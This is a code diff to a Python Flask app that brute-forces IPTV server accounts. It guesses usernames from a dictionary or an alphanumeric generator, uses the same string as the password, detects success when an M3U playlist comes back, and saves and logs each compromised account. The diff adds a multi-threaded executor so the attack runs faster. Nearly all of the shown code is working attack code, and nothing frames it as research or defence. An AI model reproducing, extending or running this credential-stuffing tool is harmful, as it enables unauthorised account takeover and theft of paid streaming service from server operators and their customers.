@@ -6,6 +6,7 @@ import time
 import string
 import itertools
 import shutil
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask, render_template, jsonify, request, send_from_directory
 from flask_cors import CORS
 import Crawler
@@ -35,6 +36,7 @@ scan_state = {
     "eta_seconds": 0,
     "elapsed_seconds": 0,
     "attack_mode": "dictionary",
+    "concurrency": 16,
     "logs": []
 }
 
@@ -157,6 +159,20 @@ def start_scan():
     attack_all = data.get("attack_all", False)
     charset_mode = data.get("mode", "dictionary")
     max_len = data.get("max_length", 12)
+    threads_count = int(data.get("threads", os.cpu_count() * 4 if os.cpu_count() else 16))
+
+    def check_username(server, username, headers):
+        if scan_state["cancel_requested"]:
+            return None
+        target_endpoint = server + crawler.basicString % (username, username)
+        import requests
+        try:
+            res = requests.get(target_endpoint, headers=headers, timeout=4)
+            if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
+                return (username, res.text)
+        except Exception:
+            pass
+        return None
 
     def run_scan():
         scan_state["is_scanning"] = True
@@ -166,6 +182,7 @@ def start_scan():
         scan_state["eta_seconds"] = 0
         scan_state["elapsed_seconds"] = 0
         scan_state["attack_mode"] = charset_mode
+        scan_state["concurrency"] = threads_count
         
         targets = []
         if attack_all:
@@ -183,79 +200,87 @@ def start_scan():
             return
 
         headers = {'User-Agent': 'Mozilla/5.0'}
-        import requests
+        log_event(f"Multi-core execution initialized: {threads_count} parallel threads (CPU cores: {os.cpu_count() or 'N/A'})", to_console=True)
 
         for server in targets:
             if scan_state["cancel_requested"]:
                 break
 
             scan_state["current_url"] = server
-            msg_start = f"Starting attack on target: {server}"
-            scan_state["status_message"] = f"Attacking {server}..."
+            msg_start = f"Starting multi-threaded attack on target: {server} [{threads_count} threads]"
+            scan_state["status_message"] = f"Attacking {server} ({threads_count} threads)..."
             log_event(msg_start, to_console=True)
 
-            word_stream = []
+            word_list = []
             if charset_mode == "alphanumeric":
                 log_event(f"Using Alphanumeric & Special Chars brute force (Up to {max_len} chars)...", to_console=True)
-                word_stream = generate_alphanumeric_generator(min_len=1, max_len=max_len)
-                total_lines = 1000000
+                # Take first chunk of generator for thread pool mapping
+                gen = generate_alphanumeric_generator(min_len=1, max_len=max_len)
+                word_list = [next(gen) for _ in range(50000)]
+                total_lines = len(word_list)
             else:
                 lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
                 if not os.path.exists(lang_file):
                     log_event("Error: Language file missing.", to_console=True)
                     continue
                 with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
-                    word_stream = [line.strip() for line in f if line.strip()]
-                total_lines = len(word_stream)
+                    word_list = [line.strip() for line in f if line.strip()]
+                total_lines = len(word_list)
 
             scan_state["total"] = total_lines
             found = 0
             start_time = time.time()
 
-            for idx, username in enumerate(word_stream, start=1):
-                if scan_state["cancel_requested"]:
-                    log_event(f"Attack cancelled on {server}.", to_console=True)
-                    break
-
-                scan_state["progress"] = idx
-                elapsed = time.time() - start_time
-                scan_state["elapsed_seconds"] = int(elapsed)
-                if idx > 1:
-                    avg_time_per_item = elapsed / idx
-                    remaining_items = total_lines - idx
-                    scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
-
-                log_event(f"request for name: {username}", to_console=False)
+            # Execute parallel HTTP checks using ThreadPoolExecutor across CPU cores
+            with ThreadPoolExecutor(max_workers=threads_count) as executor:
+                future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in word_list}
                 
-                if idx % 50 == 0:
-                    logger.info(f"Progress on {server}: {idx}/{total_lines} - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+                for idx, future in enumerate(as_completed(future_to_username), start=1):
+                    if scan_state["cancel_requested"]:
+                        log_event(f"Attack cancelled on {server}.", to_console=True)
+                        executor.shutdown(wait=False)
+                        break
 
-                target_endpoint = server + crawler.basicString % (username, username)
-                try:
-                    res = requests.get(target_endpoint, headers=headers, timeout=4)
-                    if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
-                        domain = server.replace("http://", "").replace("https://", "").strip("/")
-                        new_path = os.path.join(crawler.outputDir, domain)
-                        crawler.create_file(username, new_path, res.text)
-                        found += 1
-                        scan_state["found_accounts"] += 1
-                        
-                        m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
-                        playlist_url = f"{server}/get.php?username={username}&password={username}&type=m3u&output=mpegts"
-                        
-                        account_data = {
-                            "server": server,
-                            "username": username,
-                            "password": username,
-                            "file_path": m3u_file_path,
-                            "playlist_url": playlist_url
-                        }
-                        found_accounts_list.append(account_data)
+                    username = future_to_username[future]
+                    scan_state["progress"] = idx
+                    elapsed = time.time() - start_time
+                    scan_state["elapsed_seconds"] = int(elapsed)
+                    if idx > 1:
+                        avg_time_per_item = elapsed / idx
+                        remaining_items = total_lines - idx
+                        scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
 
-                        msg_found = f"ACCOUNT FOUND !!! -> Username: '{username}' | Password: '{username}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
-                        log_event(msg_found, to_console=True)
-                except Exception:
-                    pass
+                    log_event(f"request for name: {username}", to_console=False)
+                    
+                    if idx % 100 == 0 or idx == total_lines:
+                        logger.info(f"Parallel progress on {server}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+
+                    try:
+                        result = future.result()
+                        if result:
+                            found_uname, fetched_text = result
+                            domain = server.replace("http://", "").replace("https://", "").strip("/")
+                            new_path = os.path.join(crawler.outputDir, domain)
+                            crawler.create_file(found_uname, new_path, fetched_text)
+                            found += 1
+                            scan_state["found_accounts"] += 1
+                            
+                            m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
+                            playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
+                            
+                            account_data = {
+                                "server": server,
+                                "username": found_uname,
+                                "password": found_uname,
+                                "file_path": m3u_file_path,
+                                "playlist_url": playlist_url
+                            }
+                            found_accounts_list.append(account_data)
+
+                            msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
+                            log_event(msg_found, to_console=True)
+                    except Exception:
+                        pass
 
             if server in crawler.parsedUrls and not scan_state["cancel_requested"]:
                 crawler.parsedUrls.remove(server)
@@ -299,12 +324,10 @@ def delete_output(filepath):
         if os.path.exists(full_path) and os.path.isfile(full_path):
             os.remove(full_path)
             
-            # Remove from found_accounts_list if present
             norm_path = filepath.replace("\\", "/")
             global found_accounts_list
             found_accounts_list = [acc for acc in found_accounts_list if acc.get("file_path", "").replace("\\", "/") != norm_path]
 
-            # Clean up empty parent directory if left behind
             parent_dir = os.path.dirname(full_path)
             if os.path.exists(parent_dir) and not os.listdir(parent_dir):
                 shutil.rmtree(parent_dir, ignore_errors=True)
